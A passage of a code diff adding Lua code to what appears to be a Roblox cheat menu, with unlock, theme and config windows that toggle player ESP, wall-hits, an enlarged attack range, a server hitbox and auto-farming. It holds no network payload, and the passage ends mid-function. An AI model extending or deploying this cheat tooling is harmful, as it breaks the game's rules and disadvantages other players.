+        yesBtn.MouseEnter:Connect(function() yesBtn.BackgroundColor3 = Color3.fromRGB(230,180,0) end)
+        yesBtn.MouseLeave:Connect(function() yesBtn.BackgroundColor3 = Color3.fromRGB(200,150,0) end)
+        yesBtn.MouseButton1Click:Connect(function()
+            blatantUnlocked = true
+            sg:Destroy(); unlockConfirmGui = nil
+            -- Enable Abaddon Power section (add to visualWin scroll)
+            isAbaddonPowerEnabled = false
+            if getgenv()._spawnAbaddonPower then
+                pcall(getgenv()._spawnAbaddonPower)
+            end
+            -- Update btn appearance
+            btn.Text = "Unlocked"
+            btn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+            btn.TextColor3 = Color3.fromRGB(160, 160, 160)
+            -- Refresh power sliders to reflect new blatantUnlocked limits
+            -- sliderSyncFns already use blatantUnlocked flag, just re-call them
+            if sliderSyncFns["powerRange"] then sliderSyncFns["powerRange"](abaddonPowerRange) end
+            if sliderSyncFns["powerFOV"]   then sliderSyncFns["powerFOV"](abaddonPowerFOV) end
+            -- Reveal Hit Walls button
+            blatantHitThroughWalls = false
+            if sliderSyncFns["blatantHitWalls"] then sliderSyncFns["blatantHitWalls"]() end
+            -- Lock config window
+            if configBlurOverlay then configBlurOverlay.Visible = true end
+            -- Notify
+            showNotification("Blatant Features", {
+                { text = "Unlocked!", color = Color3.fromRGB(220, 180, 0) },
+                { text = "Range up to 24, FOV up to 350", color = Color3.fromRGB(180, 180, 180) },
+            })
+            toggleMenuWithAnimation(true)
+        end)
+    end)
+
+    unlockBtn = btn
+    savedWindowPositions[btn] = btn.Position
+end
+
+-- === МЕНЮ (THEMES) ===
+function createThemesWindow()
+    local f = Instance.new("Frame", gui); f.Name="Themes_Main"; f.Size=UDim2.new(0,220,0,520); 
+    f.Position=UDim2.new(0.5, -110, 0.22, 0); 
+    f.BackgroundColor3=menuBgColor; f.BackgroundTransparency=menuBgTransparency; f.BorderSizePixel=0
+    Instance.new("UICorner",f).CornerRadius=UDim.new(0,10)
+    local t = Instance.new("TextLabel",f); t.Text="Themes"; t.Size=UDim2.new(1,0,0,30); t.BackgroundTransparency=1; t.TextColor3=currentThemeColor; t.Font=Enum.Font.GothamBlack; t.TextSize=18
+    local s = Instance.new("ScrollingFrame",f); s.Size=UDim2.new(1,-10,1,-40); s.Position=UDim2.new(0,5,0,35); s.BackgroundTransparency=1; s.BorderSizePixel=0; s.ScrollBarThickness=4
+    Instance.new("UIListLayout",s).SortOrder = Enum.SortOrder.LayoutOrder
+    s.UIListLayout.Padding = UDim.new(0,8)
+
+    local orderCounter = 0
+    local function btn(nm, id, col)
+        orderCounter = orderCounter + 1
+        local b = Instance.new("TextButton", s); b.Size=UDim2.new(1,0,0,35); b.BackgroundColor3=Color3.fromRGB(35,35,35); b.Text=""; Instance.new("UICorner",b).CornerRadius=UDim.new(0,12)
+        b.BackgroundTransparency = 0.6
+        b.LayoutOrder = orderCounter
+        local d = Instance.new("Frame", b); d.Size=UDim2.new(0,20,0,20); d.Position=UDim2.new(0,8,0.5,-10); d.BackgroundColor3=col; Instance.new("UICorner",d).CornerRadius=UDim.new(1,0)
+        local l = Instance.new("TextLabel", b); l.Size=UDim2.new(1,-40,1,0); l.Position=UDim2.new(0,35,0,0); l.BackgroundTransparency=1; l.Text=nm; l.TextColor3=Color3.new(1,1,1); l.Font=Enum.Font.GothamBold; l.TextSize=13; l.TextXAlignment=Enum.TextXAlignment.Left
+        b.MouseButton1Click:Connect(function()
+            currentThemeColor = col; currentThemeName = id
+            updateAllVisuals()
+        end)
+    end
+
+    btn("Abaddon (Green)", "Abaddon", Color3.fromRGB(0, 255, 0))
+    btn("Santa (Red)", "Santa", Color3.fromRGB(255, 0, 0))
+    btn("Jack (Orange)", "Jack", Color3.fromRGB(255, 140, 0))
+    btn("Zephyr (Blue)", "Zephyr", Color3.fromRGB(0, 200, 255))
+    btn("Void (Purple)", "Void", Color3.fromRGB(170, 0, 255))
+    btn("Evelyn (Deep Blue)", "Evelyn", Color3.fromRGB(0, 80, 255)) 
+    btn("Caitlyn (White)", "Caitlyn", Color3.fromRGB(240, 240, 240)) 
+    btn("Black (Dark)", "Black", Color3.fromRGB(30, 30, 30))
+    btn("Pink (Valentine Aery)", "Pink", Color3.fromRGB(255, 105, 180))
+
+    orderCounter = orderCounter + 1
+    local div = Instance.new("Frame", s); div.Size=UDim2.new(1,0,0,2); div.BackgroundColor3=Color3.fromRGB(60,60,60); div.BorderSizePixel=0
+    div.LayoutOrder = orderCounter
+
+    orderCounter = orderCounter + 1
+    local custLbl = Instance.new("TextLabel", s); custLbl.Text="Custom Color (RGB)"; custLbl.Size=UDim2.new(1,0,0,20); custLbl.BackgroundTransparency=1; custLbl.TextColor3=Color3.fromRGB(180,180,180); custLbl.Font=Enum.Font.GothamBold; custLbl.TextSize=12
+    custLbl.LayoutOrder = orderCounter
+
+    local cR, cG, cB = 255, 255, 255
+    local function updateCustom()
+        currentThemeColor = Color3.fromRGB(cR, cG, cB)
+        currentThemeName = "Custom"
+        updateAllVisuals()
+    end
+    
+    local function createSlider(text, color, default, callback)
+        orderCounter = orderCounter + 1
+        local c = Instance.new("Frame", s); c.Size=UDim2.new(1,0,0,40); c.BackgroundTransparency=1
+        c.LayoutOrder = orderCounter
+        
+        local l = Instance.new("TextLabel", c); l.Text=text; l.Size=UDim2.new(1,0,0,15); l.BackgroundTransparency=1; l.TextColor3=color; l.Font=Enum.Font.GothamBold; l.TextSize=12; l.TextXAlignment=Enum.TextXAlignment.Left
+        local bg = Instance.new("TextButton", c); bg.Size=UDim2.new(1,0,0,10); bg.Position=UDim2.new(0,0,0,20); bg.BackgroundColor3=Color3.fromRGB(40,40,40); bg.AutoButtonColor=false; bg.Text=""
+        bg.BackgroundTransparency = 0.5
+        Instance.new("UICorner",bg).CornerRadius=UDim.new(1,0)
+        local fill = Instance.new("Frame", bg); fill.Name="ThemeSliderFill"; fill.Size=UDim2.new(default/255,0,1,0); fill.BackgroundColor3=color; fill.BorderSizePixel=0
+        Instance.new("UICorner",fill).CornerRadius=UDim.new(1,0)
+        local dragging = false
+        bg.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end end)
+        bg.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+        UIS.InputChanged:Connect(function(input)
+            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                local relativeX = math.clamp((input.Position.X - bg.AbsolutePosition.X) / bg.AbsoluteSize.X, 0, 1)
+                fill.Size = UDim2.new(relativeX, 0, 1, 0)
+                callback(math.floor(relativeX * 255))
+            end
+        end)
+    end
+    
+    createSlider("Red", Color3.fromRGB(255, 80, 80), cR, function(v) cR = v; updateCustom() end)
+    createSlider("Green", Color3.fromRGB(80, 255, 80), cG, function(v) cG = v; updateCustom() end)
+    createSlider("Blue", Color3.fromRGB(80, 80, 255), cB, function(v) cB = v; updateCustom() end)
+    
+    orderCounter = orderCounter + 1
+    local div2 = Instance.new("Frame", s); div2.Size=UDim2.new(1,0,0,2); div2.BackgroundColor3=Color3.fromRGB(60,60,60); div2.BorderSizePixel=0
+    div2.LayoutOrder = orderCounter
+
+    orderCounter = orderCounter + 1
+    local bgLbl = Instance.new("TextLabel", s); bgLbl.Text="Menu Background (RGB)"; bgLbl.Size=UDim2.new(1,0,0,20); bgLbl.BackgroundTransparency=1; bgLbl.TextColor3=Color3.fromRGB(180,180,180); bgLbl.Font=Enum.Font.GothamBold; bgLbl.TextSize=12
+    bgLbl.LayoutOrder = orderCounter
+
+    local function createBgSlider(text, color, defaultV, getV, setV)
+        orderCounter = orderCounter + 1
+        local c = Instance.new("Frame", s); c.Size=UDim2.new(1,0,0,40); c.BackgroundTransparency=1
+        c.LayoutOrder = orderCounter
+        local l = Instance.new("TextLabel", c); l.Text=text; l.Size=UDim2.new(1,0,0,15); l.BackgroundTransparency=1; l.TextColor3=color; l.Font=Enum.Font.GothamBold; l.TextSize=12; l.TextXAlignment=Enum.TextXAlignment.Left
+        local bgB = Instance.new("TextButton", c); bgB.Size=UDim2.new(1,0,0,10); bgB.Position=UDim2.new(0,0,0,20); bgB.BackgroundColor3=Color3.fromRGB(40,40,40); bgB.AutoButtonColor=false; bgB.Text=""
+        bgB.BackgroundTransparency = 0.5
+        Instance.new("UICorner",bgB).CornerRadius=UDim.new(1,0)
+        local fill = Instance.new("Frame", bgB); fill.Name="MenuSliderFill"; fill.Size=UDim2.new(defaultV/255,0,1,0); fill.BackgroundColor3=color; fill.BorderSizePixel=0
+        Instance.new("UICorner",fill).CornerRadius=UDim.new(1,0)
+        local dragging = false
+        bgB.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=true end end)
+        bgB.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=false end end)
+        UIS.InputChanged:Connect(function(i)
+            if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
+                local rx = math.clamp((i.Position.X - bgB.AbsolutePosition.X)/bgB.AbsoluteSize.X,0,1)
+                fill.Size = UDim2.new(rx,0,1,0)
+                setV(math.floor(rx*255))
+                menuBgColor = Color3.fromRGB(menuBgR, menuBgG, menuBgB)
+                updateMenuBg()
+            end
+        end)
+        -- sliderSyncFn so config restore updates the fill
+        sliderSyncFns["menuBg"..text] = function(v)
+            fill.Size = UDim2.new(v/255,0,1,0)
+            fill.BackgroundColor3 = color  -- keep colored
+        end
+    end
+    createBgSlider("Red",   Color3.fromRGB(255,80,80),  menuBgR, menuBgR, function(v) menuBgR=v end)
+    createBgSlider("Green", Color3.fromRGB(80,255,80),  menuBgG, menuBgG, function(v) menuBgG=v end)
+    createBgSlider("Blue",  Color3.fromRGB(80,80,255),  menuBgB, menuBgB, function(v) menuBgB=v end)
+
+    -- Transparency slider (0.0 = opaque, 0.9 = almost transparent)
+    orderCounter = orderCounter + 1
+    local trFrame = Instance.new("Frame", s); trFrame.Size=UDim2.new(1,0,0,40); trFrame.BackgroundTransparency=1; trFrame.LayoutOrder=orderCounter
+    local trLbl = Instance.new("TextLabel", trFrame); trLbl.Text="Transparency"; trLbl.Size=UDim2.new(1,0,0,15); trLbl.BackgroundTransparency=1; trLbl.TextColor3=Color3.fromRGB(180,180,180); trLbl.Font=Enum.Font.GothamBold; trLbl.TextSize=12; trLbl.TextXAlignment=Enum.TextXAlignment.Left
+    local trBg = Instance.new("TextButton", trFrame); trBg.Size=UDim2.new(1,0,0,10); trBg.Position=UDim2.new(0,0,0,20); trBg.BackgroundColor3=Color3.fromRGB(40,40,40); trBg.AutoButtonColor=false; trBg.Text=""; trBg.BackgroundTransparency=0.5
+    Instance.new("UICorner",trBg).CornerRadius=UDim.new(1,0)
+    local trFill = Instance.new("Frame",trBg); trFill.Name="SliderFill"; trFill.Size=UDim2.new(menuBgTransparency/0.95,0,1,0); trFill.BackgroundColor3=currentThemeColor; trFill.BorderSizePixel=0
+    Instance.new("UICorner",trFill).CornerRadius=UDim.new(1,0)
+    local trDrag=false
+    trBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then trDrag=true end end)
+    trBg.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then trDrag=false end end)
+    UIS.InputChanged:Connect(function(i)
+        if trDrag and i.UserInputType==Enum.UserInputType.MouseMovement then
+            local rx=math.clamp((i.Position.X-trBg.AbsolutePosition.X)/trBg.AbsoluteSize.X,0,1)
+            trFill.Size=UDim2.new(rx,0,1,0)
+            menuBgTransparency = rx*0.95
+            updateMenuBg()
+        end
+    end)
+    sliderSyncFns["menuBgTransparency"] = function(v) trFill.Size=UDim2.new(v/0.95,0,1,0) end
+
+    themeWin = f
+    savedWindowPositions[f] = f.Position
+end
+
+-- === CONFIG WINDOW (UI only — logic injected by loadstring) ===
+-- configWin/_cfgListContainer are globals so they don't burn local registers
+configWin = nil
+_cfgListContainer = nil
+
+function createConfigWindow()
+    if configWin then configWin:Destroy() end
+    local f = Instance.new("Frame", gui)
+    f.Name = "Config_Main"
+    f.Size = UDim2.new(0, 220, 0, 520)
+    f.Position = UDim2.new(0.5, 350, 0.22, 0)
+    f.BackgroundColor3 = menuBgColor
+    f.BackgroundTransparency = 0.4
+    f.BorderSizePixel = 0
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 10)
+
+    local title = Instance.new("TextLabel", f)
+    title.Name = "WinTitle"; title.Text = "Config"
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundTransparency = 1
+    title.TextColor3 = currentThemeColor
+    title.Font = Enum.Font.GothamBlack; title.TextSize = 18
+
+    local scroll = Instance.new("ScrollingFrame", f)
+    scroll.Size = UDim2.new(1, -10, 1, -40)
+    scroll.Position = UDim2.new(0, 5, 0, 35)
+    scroll.BackgroundTransparency = 1
+    scroll.BorderSizePixel = 0
+    scroll.ScrollBarThickness = 4
+    local mainLayout = Instance.new("UIListLayout", scroll)
+    mainLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    mainLayout.Padding = UDim.new(0, 6)
+    local mlo = 0; local function mnlo() mlo = mlo + 1; return mlo end
+
+    local saveLbl = Instance.new("TextLabel", scroll)
+    saveLbl.LayoutOrder = mnlo(); saveLbl.Size = UDim2.new(1, 0, 0, 14)
+    saveLbl.BackgroundTransparency = 1
+    saveLbl.TextColor3 = Color3.fromRGB(130, 130, 130)
+    saveLbl.Font = Enum.Font.GothamBold; saveLbl.TextSize = 10
+    saveLbl.Text = "── SAVE CONFIG ──"
+
+    local nameBox = Instance.new("TextBox", scroll)
+    nameBox.Name = "CfgNameBox"; nameBox.LayoutOrder = mnlo()
+    nameBox.Size = UDim2.new(1, 0, 0, 30)
+    nameBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    nameBox.BackgroundTransparency = 0.3; nameBox.BorderSizePixel = 0
+    nameBox.TextColor3 = Color3.new(1, 1, 1)
+    nameBox.Font = Enum.Font.Gotham; nameBox.TextSize = 12
+    nameBox.PlaceholderText = "Config name..."
+    nameBox.ClearTextOnFocus = false; nameBox.Text = ""
+    Instance.new("UICorner", nameBox).CornerRadius = UDim.new(0, 8)
+
+    local saveBtn = Instance.new("TextButton", scroll)
+    saveBtn.Name = "CfgSaveBtn"; saveBtn.LayoutOrder = mnlo()
+    saveBtn.Size = UDim2.new(1, 0, 0, 30)
+    saveBtn.BackgroundColor3 = currentThemeColor
+    saveBtn.BackgroundTransparency = 0.3; saveBtn.BorderSizePixel = 0
+    saveBtn.Font = Enum.Font.GothamBold; saveBtn.TextSize = 13
+    saveBtn.Text = "💾 Save Config"
+    saveBtn.TextColor3 = Color3.new(0, 0, 0); saveBtn.AutoButtonColor = false
+    Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 8)
+
+    -- Update existing config button
+    local updateBtn = Instance.new("TextButton", scroll)
+    updateBtn.Name = "CfgUpdateBtn"; updateBtn.LayoutOrder = mnlo()
+    updateBtn.Size = UDim2.new(1, 0, 0, 28)
+    updateBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    updateBtn.BackgroundTransparency = 0.3; updateBtn.BorderSizePixel = 0
+    updateBtn.Font = Enum.Font.GothamBold; updateBtn.TextSize = 12
+    updateBtn.Text = "Update Config"
+    updateBtn.TextColor3 = Color3.new(1, 1, 1); updateBtn.AutoButtonColor = false
+    Instance.new("UICorner", updateBtn).CornerRadius = UDim.new(0, 8)
+
+    local divider = Instance.new("Frame", scroll)
+    divider.LayoutOrder = mnlo(); divider.Size = UDim2.new(1, 0, 0, 2)
+    divider.BackgroundColor3 = Color3.fromRGB(55, 55, 55); divider.BorderSizePixel = 0
+
+    local listLbl = Instance.new("TextLabel", scroll)
+    listLbl.LayoutOrder = mnlo(); listLbl.Size = UDim2.new(1, 0, 0, 14)
+    listLbl.BackgroundTransparency = 1
+    listLbl.TextColor3 = Color3.fromRGB(130, 130, 130)
+    listLbl.Font = Enum.Font.GothamBold; listLbl.TextSize = 10
+    listLbl.Text = "── SAVED CONFIGS ──"
+
+    local refreshBtn = Instance.new("TextButton", scroll)
+    refreshBtn.Name = "CfgRefreshBtn"; refreshBtn.LayoutOrder = mnlo()
+    refreshBtn.Size = UDim2.new(1, 0, 0, 24)
+    refreshBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    refreshBtn.BackgroundTransparency = 0.4; refreshBtn.BorderSizePixel = 0
+    refreshBtn.Font = Enum.Font.Gotham; refreshBtn.TextSize = 11
+    refreshBtn.Text = "Refresh Configs"
+    refreshBtn.TextColor3 = Color3.new(0.8, 0.8, 0.8); refreshBtn.AutoButtonColor = false
+    Instance.new("UICorner", refreshBtn).CornerRadius = UDim.new(0, 6)
+
+    -- Container populated by loadstring script
+    local listContainer = Instance.new("ScrollingFrame", scroll)
+    listContainer.Name = "CfgListContainer"; listContainer.LayoutOrder = mnlo()
+    listContainer.Size = UDim2.new(1, 0, 0, 310)
+    listContainer.BackgroundTransparency = 1; listContainer.BorderSizePixel = 0
+    listContainer.ScrollBarThickness = 3
+    local listLayout = Instance.new("UIListLayout", listContainer)
+    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    listLayout.Padding = UDim.new(0, 4)
+    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        listContainer.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 6)
+    end)
+
+    -- Placeholder text before loadstring connects
+    local ph = Instance.new("TextLabel", listContainer)
+    ph.Name = "Placeholder"; ph.LayoutOrder = 1
+    ph.Size = UDim2.new(1, 0, 0, 24); ph.BackgroundTransparency = 1
+    ph.TextColor3 = Color3.fromRGB(100, 100, 100)
+    ph.Font = Enum.Font.Gotham; ph.TextSize = 11
+    ph.Text = "Execute config script to activate"
+
+    mainLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        scroll.CanvasSize = UDim2.new(0, 0, 0, mainLayout.AbsoluteContentSize.Y + 8)
+    end)
+
+    -- Expose references for loadstring
+    _cfgListContainer = listContainer
+    getgenv()._cfgUpdateBtn = updateBtn
+    getgenv()._cfgRefreshBtn = refreshBtn
+
+    -- Blatant lock overlay (shown when blatantUnlocked)
+    local blurOvr = Instance.new("TextButton", f)  -- TextButton intercepts all clicks
+    blurOvr.Name = "BlatantLockOverlay"
+    blurOvr.Text = ""
+    blurOvr.AutoButtonColor = false
+    blurOvr.Size = UDim2.new(1, 0, 1, 0)
+    blurOvr.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    blurOvr.BackgroundTransparency = 0.35
+    blurOvr.BorderSizePixel = 0
+    blurOvr.ZIndex = 10
+    blurOvr.Visible = false
+    Instance.new("UICorner", blurOvr).CornerRadius = UDim.new(0, 10)
+    -- Lock icon
+    local lockIco = Instance.new("TextLabel", blurOvr)
+    lockIco.Size = UDim2.new(0, 60, 0, 60)
+    lockIco.AnchorPoint = Vector2.new(0.5, 0.5)
+    lockIco.Position = UDim2.new(0.5, 0, 0.4, 0)
+    lockIco.BackgroundTransparency = 1
+    lockIco.Text = "🔒"
+    lockIco.TextSize = 40
+    lockIco.Font = Enum.Font.Gotham
+    lockIco.ZIndex = 11
+    local lockTxt = Instance.new("TextLabel", blurOvr)
+    lockTxt.Size = UDim2.new(1, -20, 0, 24)
+    lockTxt.AnchorPoint = Vector2.new(0.5, 0)
+    lockTxt.Position = UDim2.new(0.5, 0, 0.4, 44)
+    lockTxt.BackgroundTransparency = 1
+    lockTxt.Text = "Locked in Blatant Mode"
+    lockTxt.TextSize = 12
+    lockTxt.Font = Enum.Font.GothamBold
+    lockTxt.TextColor3 = Color3.fromRGB(200, 180, 0)
+    lockTxt.TextWrapped = true
+    lockTxt.ZIndex = 11
+    configBlurOverlay = blurOvr
+    configLockIcon    = lockIco
+
+    configWin = f
+    savedWindowPositions[f] = f.Position
+    applyLayoutPos(f)
+end
+createConfigWindow()
+-- Expose to getgenv so loadstring config script can find them
+pcall(function()
+    getgenv()._cfgListContainer = _cfgListContainer
+    getgenv().configWin = configWin
+    getgenv()._hubShowNotification = showNotification
+    getgenv()._hubUpdateAllVisuals = updateAllVisuals
+
+    -- Sync all button visuals to current state vars (call after config load)
+    getgenv()._hubSyncButtons = function()
+        local stateMap = {
+            kitEsp       = isKitEspEnabled,
+            serverHitbox = isServerHitboxEnabled,
+            strategicEsp = isStrategicEspEnabled,
+            oreEsp       = isOreEspEnabled,
+            oreEspR      = oreEspColorR,
+            oreEspG      = oreEspColorG,
+            oreEspB      = oreEspColorB,
+            targetScanner = isTargetScannerEnabled,
+            autokit      = isAutokitEnabled,
+            autokitElder = isElderAutokitEnabled,
+            fisher       = isFisherEnabled,
+            farmer       = isFarmerEnabled,
+            abaddonHud   = isAbaddonHudEnabled,
+            espEnabled   = isPlayerEspEnabled,
+            friendHp     = isFriendHpEnabled,
+            bedAlarm     = isBedAlarmEnabled,
+            panicCircle  = isPanicCircleEnabled,
+            hitSound     = isHitSoundEnabled,
+            mainHud      = isMainHudEnabled,
+            serverHp     = isServerHpEnabled,
+            staffStats   = isStaffStatsEnabled,
+            primeMode    = isPrimeModeEnabled,
+            crosshairHp  = isCrosshairHpEnabled,
+        }
+        for key, state in pairs(stateMap) do
+            if buttonSyncFns[key] then
+                pcall(buttonSyncFns[key], state)
+            end
+        end
+    end
+
+    -- Closure: читає поточний стан всіх налаштувань
+    getgenv()._hubGetState = function()
+        -- Block save if blatant values are active
+        if blatantUnlocked and (abaddonPowerRange > 14 or abaddonPowerFOV > 200) then
+            return nil  -- config manager should check for nil
+        end
+        local tc = currentThemeColor
+        return {
+            -- Тема
+            theme      = currentThemeName,
+            themeR     = math.floor(tc.R*255+0.5),
+            menuBgR    = menuBgR,
+            menuBgG    = menuBgG,
+            menuBgB    = menuBgB,
+            menuBgTr   = menuBgTransparency,
+            themeG     = math.floor(tc.G*255+0.5),
+            themeB     = math.floor(tc.B*255+0.5),
+            -- ESP
+            espEnabled   = isPlayerEspEnabled,
+            espMode      = currentEspMode,
+            espHp        = isEspHpEnabled,
+            espBind      = playerEspKeybind.Name,
+            kitEsp       = isKitEspEnabled,
+            strategicEsp = isStrategicEspEnabled,
+            oreEsp       = isOreEspEnabled,
+            targetEsp    = isTargetEspEnabled,
+            targetEspName = targetEspName,
+            -- Abaddon Power
+            -- HUDs
+            abaddonHud = isAbaddonHudEnabled,
+            mainHud    = isMainHudEnabled,
+            -- Server HP / Staff Stats
+            serverHp   = isServerHpEnabled,
+            staffStats = isStaffStatsEnabled,
+            -- Friend HP
+            friendHp   = isFriendHpEnabled,
+			friendHpVisible = isFriendHpVisible,
+            friendBind = friendHpKeybind.Name,
+            friendNick1 = friendTargetNames[1] or "",
+            friendNick2 = friendTargetNames[2] or "",
+            friendNick3 = friendTargetNames[3] or "",
+            -- Hit Sound
+            hitSound   = isHitSoundEnabled,
+            hitSoundId = hitSoundId,
+            -- Bed Alarm
+            bedAlarm       = isBedAlarmEnabled,
+            bedAlarmRadius = bedAlarmRadius,
+            bedAlarmVolume = bedAlarmVolume,
+            bedAlarmSoundId = alarmSoundId,
+            -- Panic Circle
+            panicCircle  = isPanicCircleEnabled,
+            panicRadius  = panicCircleRadius,
+            panicVolume  = panicCircleVolume,
+            panicSoundId = panicSoundId,
+            -- Server Hitbox
+            serverHitbox = isServerHitboxEnabled,
+            -- Target Scanner
+            targetScanner = isTargetScannerEnabled,
+            -- Autokit
+            autokit     = isAutokitEnabled,
+            autokitHold = autokitHoldDuration,
+            autokitElder = isElderAutokitEnabled,
+            elderHold   = elderHoldDuration,
+            -- Fisher / Farmer
+            fisher      = isFisherEnabled,
+            farmer      = isFarmerEnabled,
+            farmerRange    = farmerRange,
+            farmerDelay    = farmerDelay,
+            playerRadar    = isRadarEnabled,
+            hitChams       = isHitChamsEnabled,
+            hitChamsR      = hitChamsR,
+            hitChamsG      = hitChamsG,
+            hitChamsB      = hitChamsB,
+            hitChamsInt    = hitChamsIntensity,
+            hitChamsDur    = hitChamsDuration,
+            voidDrop       = isVoidDropEnabled,
+            voidDropDelay  = voidDropDelay,
+            voidDropHeight = voidDropHeight,
+            -- Taliyah Predictor
+            taliyah     = isTaliyahEnabled,
+            taliyahWave = taliyahWave,
+            taliyahBase = taliyahBasePriceIdx,
+            taliyahMax  = taliyahMaxIdx,
+            primeMode      = isPrimeModeEnabled,
+            crosshairHp    = isCrosshairHpEnabled,
+            primeModeVol   = primeModeVolume,
+            primeModeEcho  = primeModeEcho,
+            primeModeShake    = primeModeShake,
+            primeModeChangeFov = primeModeChangeFov,
+            primeBind      = primeModeKeybind ~= Enum.KeyCode.Unknown and primeModeKeybind.Name or "Unknown",
+            -- World Color
+            worldColor   = wcEnabled,
+            wcR          = wcColorR,
+            wcG          = wcColorG,
+            wcB          = wcColorB,
+            wcIntensity  = wcIntensity,
+            -- Window positions keyed by frame Name
+            winPos      = savedLayoutPositions,
+        }
+    end
+
+    -- Closure: застосовує стан до всіх налаштувань (має прямий доступ до upvalues)
+    getgenv()._hubSetState = function(d)
+        -- Window positions
+        if type(d.winPos) == "table" then
+            for name, p in pairs(d.winPos) do
+                if type(p) == "table" and #p == 4 then
+                    savedLayoutPositions[name] = p
+                    -- Also apply immediately to any window already open
+                    local frame = gui:FindFirstChild(name, false)
+    					or (mainHudGui and mainHudGui:FindFirstChild(name, true))
+                    if frame then
+                        local newPos = UDim2.new(p[1], p[2], p[3], p[4])
+                        frame.Position = newPos
+                        savedWindowPositions[frame] = newPos
+                    end
+                end
+            end
+        end
+        -- ── Тема ────────────────────────────────────────────────────
+        if d.themeR then currentThemeColor = Color3.fromRGB(d.themeR, d.themeG, d.themeB) end
+        if d.menuBgR ~= nil then menuBgR=d.menuBgR end
+        if d.menuBgG ~= nil then menuBgG=d.menuBgG end
+        if d.menuBgB ~= nil then menuBgB=d.menuBgB end
+        if d.menuBgTr ~= nil then menuBgTransparency=d.menuBgTr end
+        menuBgColor = Color3.fromRGB(menuBgR, menuBgG, menuBgB)
+        if sliderSyncFns["menuBgRed"]   then sliderSyncFns["menuBgRed"](menuBgR) end
+        if sliderSyncFns["menuBgGreen"] then sliderSyncFns["menuBgGreen"](menuBgG) end
+        if sliderSyncFns["menuBgBlue"]  then sliderSyncFns["menuBgBlue"](menuBgB) end
+        if sliderSyncFns["menuBgTransparency"] then sliderSyncFns["menuBgTransparency"](menuBgTransparency) end
+        pcall(updateMenuBg)
+        if d.theme  then currentThemeName = d.theme end
+
+        -- ── Числові / рядкові налаштування (без активації) ──────────
+        if d.espMode       then currentEspMode = d.espMode end
+        if d.espHp ~= nil  then
+            isEspHpEnabled = d.espHp
+            if not d.espHp then
+                for _, obj in pairs(espFolderPlayers:GetChildren()) do
+                    if obj.Name:sub(-3) == "_BB" then
+                        local hs = obj:FindFirstChild("HpSection")
+                        if hs then hs.Visible = false end
+                    end
+                end
+            end
+        end
+        if d.espBind and d.espBind ~= "Unknown" then
+            pcall(function() playerEspKeybind = Enum.KeyCode[d.espBind] end)
+        end
+        if d.targetEspName ~= nil then targetEspName = d.targetEspName end
+        if d.friendBind and d.friendBind ~= "Unknown" then
+            pcall(function() friendHpKeybind = Enum.KeyCode[d.friendBind] end)
+        end
+        if d.friendNick1 ~= nil then friendTargetNames[1] = d.friendNick1 end
+        if d.friendNick2 ~= nil then friendTargetNames[2] = d.friendNick2 end
+        if d.friendNick3 ~= nil then friendTargetNames[3] = d.friendNick3 end
+        -- Sync nickname textboxes to loaded values
+        for i = 1, 3 do
+            if sliderSyncFns["friendNick"..i] then sliderSyncFns["friendNick"..i]() end
+        end
+        if d.hitSoundId    then hitSoundId         = d.hitSoundId end
+        if d.bedAlarmRadius then bedAlarmRadius    = d.bedAlarmRadius end
+        if d.bedAlarmVolume then bedAlarmVolume    = d.bedAlarmVolume end
+        if d.bedAlarmSoundId then alarmSoundId     = d.bedAlarmSoundId end
+        if d.panicRadius   then panicCircleRadius  = d.panicRadius end
+        if d.panicVolume   then panicCircleVolume  = d.panicVolume end
+        if d.panicSoundId  then panicSoundId       = d.panicSoundId end
+        if d.autokitHold   then autokitHoldDuration = d.autokitHold end
+        if d.elderHold     then elderHoldDuration   = d.elderHold end
+        if d.farmerRange   then farmerRange = d.farmerRange end
+        if d.farmerDelay   then farmerDelay = d.farmerDelay end
+        if d.playerRadar ~= nil then toggleRadar(d.playerRadar); if buttonSyncFns["playerRadar"] then buttonSyncFns["playerRadar"](d.playerRadar) end end
+        if d.hitChamsR   ~= nil then hitChamsR=d.hitChamsR; if sliderSyncFns["hitChamsR"]   then sliderSyncFns["hitChamsR"](d.hitChamsR)   end end
+        if d.hitChamsG   ~= nil then hitChamsG=d.hitChamsG; if sliderSyncFns["hitChamsG"]   then sliderSyncFns["hitChamsG"](d.hitChamsG)   end end
+        if d.hitChamsB   ~= nil then hitChamsB=d.hitChamsB; if sliderSyncFns["hitChamsB"]   then sliderSyncFns["hitChamsB"](d.hitChamsB)   end end
+        if d.hitChamsInt ~= nil then hitChamsIntensity=d.hitChamsInt; if sliderSyncFns["hitChamsIntensity"] then sliderSyncFns["hitChamsIntensity"](d.hitChamsInt) end end
+        if d.hitChamsDur  ~= nil then hitChamsDuration=d.hitChamsDur;  if sliderSyncFns["hitChamsDur"]  then sliderSyncFns["hitChamsDur"](d.hitChamsDur)   end end
+        if d.hitChams    ~= nil then toggleHitChams(d.hitChams); if buttonSyncFns["hitChams"] then buttonSyncFns["hitChams"](d.hitChams) end end
+        if d.voidDropDelay  ~= nil then
+            voidDropDelay = d.voidDropDelay
+            if sliderSyncFns["voidDropDelay"]  then sliderSyncFns["voidDropDelay"](d.voidDropDelay) end
+        end
+        if d.voidDropHeight ~= nil then
